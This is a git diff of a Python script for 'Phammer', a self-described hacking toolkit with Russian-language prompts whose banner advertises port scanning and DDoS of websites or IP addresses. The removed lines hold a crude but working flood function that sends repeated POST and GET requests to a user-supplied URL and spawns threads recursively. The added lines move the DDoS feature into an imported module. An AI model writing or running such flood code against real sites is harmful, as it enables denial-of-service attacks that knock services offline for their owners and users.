@@ -1,13 +1,16 @@
+
 from colorama import Fore, Back, Style
 from datetime import datetime
 from threading import Thread
+import time
 import sys
 import requests
 import os
-import time
 import socket
 import random
+import threading
 import progressbar
+
 
 
 #Вывод poket
@@ -20,16 +23,16 @@ print(Fore.YELLOW + '''
 //         //      //   //   //     //             //
 //         //////////   //    //    ////////       // 
 >--------------------------------------------->
-Phammer создан в Python3.7
+Phammer0.1 создан в Python3.7
                             Create by Poketoff
 ┌─────────────────────────────────────────────┐
 │   Tos:  Не используйте для ддоса дневников  │
 ├─────────────────────────────────────────────┤
 │                 New stuff:                  │
-│          + Fast Port Re-use                 │
-│          + Added Random client ip           │
-│          + Added socks mode selection       │
-│          + Fixed slow mode                  │
+│          + Добавлен тул сканирования портов │
+│          + Добавлен тул ддоса сайта/ip      │
+│                                             │
+│                                             │
 ├─────────────────────────────────────────────┤
 │ Link: https://github.com/poketoff/phammer   │
 └─────────────────────────────────────────────┘''')
@@ -68,16 +71,7 @@ def hash_check():
 			password += random.choice(chars)
 		print("Твой hash=> " + password)
 #функция ddos
-def ddos():
-	url = input("URL-адрес: ")
-	thrnom = input("Ресурс: ")
-	while(1<10):
-		spam = requests.post(url)
-		spam2 = requests.get(url)
-		for i in range(int(thrnom)):
-			thr = Thread(target = ddos)
-			thr.start()
-			print(Fore.RED + "DDoS ИДЕТ")
+
 
 
 
@@ -94,6 +88,7 @@ hash_check()
 
 print(Fore.GREEN + "Вывожу меню")
 
+
 #функция вывода меню
 def show_main_menu():
 	print(Style.RESET_ALL)
@@ -104,9 +99,10 @@ def show_main_menu():
 show_main_menu()
 
 choice = input(Fore.RED + "> ")
+print(Style.RESET_ALL)
 
 if choice == "0":
 	exit("ТВОЙ IP УЖЕ У ФСБ :3")
 
 elif choice == "1":
-	ddos()
+	from ddos import DoS
